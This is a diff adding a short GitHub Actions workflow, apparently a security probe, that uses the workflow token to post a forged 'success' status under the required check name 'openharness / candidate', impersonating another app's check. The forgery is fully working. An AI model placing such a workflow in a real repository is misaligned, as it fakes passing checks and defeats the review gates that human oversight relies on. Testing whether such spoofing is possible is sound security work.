@@ -1,0 +1,13 @@
+name: Candidate source spoof probe
+on: [push, pull_request]
+permissions:
+  statuses: write
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attempt same-App required status impersonation
+        env:
+          GH_TOKEN: ${{ github.token }}
+          SUBJECT: ${{ github.event.pull_request.head.sha || github.sha }}
+        run: gh api --method POST repos/${{ github.repository }}/statuses/$SUBJECT -f state=success -f context='openharness / candidate'
